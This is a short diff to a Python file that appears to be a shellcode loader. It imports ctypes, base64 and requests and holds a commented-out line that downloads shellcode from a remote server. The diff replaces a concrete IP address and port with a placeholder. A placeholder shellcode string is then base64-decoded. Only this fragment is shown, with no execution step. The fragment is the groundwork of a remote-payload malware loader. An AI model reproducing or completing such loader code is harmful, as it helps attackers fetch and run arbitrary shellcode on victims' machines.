@@ -5,7 +5,7 @@ import base64
 
 sc = '''
 import ctypes,base64,requests
-#r = requests.get('http://116.85.16.53:8888/sc.txt')
+#r = requests.get('http://ip:port/sc.txt')
 #sc = r.content.strip()
 sc = b'en-shellcode'
 sc = base64.b64decode(sc)
